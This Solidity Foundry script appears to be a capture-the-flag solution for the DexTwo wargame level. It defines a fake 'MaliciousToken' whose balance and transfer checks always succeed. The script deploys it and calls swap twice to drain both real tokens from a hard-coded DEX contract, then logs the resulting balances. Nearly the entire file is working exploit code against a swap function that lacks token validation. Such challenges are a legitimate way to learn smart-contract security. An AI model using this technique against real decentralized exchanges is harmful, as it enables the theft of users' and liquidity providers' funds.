// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/DexTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MaliciousToken {
    function balanceOf(address) external view returns (uint256) {
        return 1;
    }

    function transferFrom(address, address, uint) external returns (bool) {
        return true;
    }
}

contract DexTwoSolution is Script {
    DexTwo constant dexTwoInstance =
        DexTwo(0x16B1AAb32d7B02eEFf5fF3F88e1D1548b42EaFDa);
    SwappableTokenTwo swappableTokenTwoInstance1 =
        SwappableTokenTwo(dexTwoInstance.token1());
    SwappableTokenTwo swappableTokenTwoInstance2 =
        SwappableTokenTwo(dexTwoInstance.token2());

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MaliciousToken maliciousToken = new MaliciousToken();
        dexTwoInstance.swap(
            address(maliciousToken),
            address(swappableTokenTwoInstance2),
            1
        );
        dexTwoInstance.swap(
            address(maliciousToken),
            address(swappableTokenTwoInstance1),
            1
        );
        console.log(
            swappableTokenTwoInstance1.balanceOf(address(dexTwoInstance))
        );
        console.log(
            swappableTokenTwoInstance2.balanceOf(address(dexTwoInstance))
        );
        console.log(
            address(swappableTokenTwoInstance1),
            swappableTokenTwoInstance1.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
        console.log(
            address(swappableTokenTwoInstance2),
            swappableTokenTwoInstance2.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
        vm.stopBroadcast();
    }
}
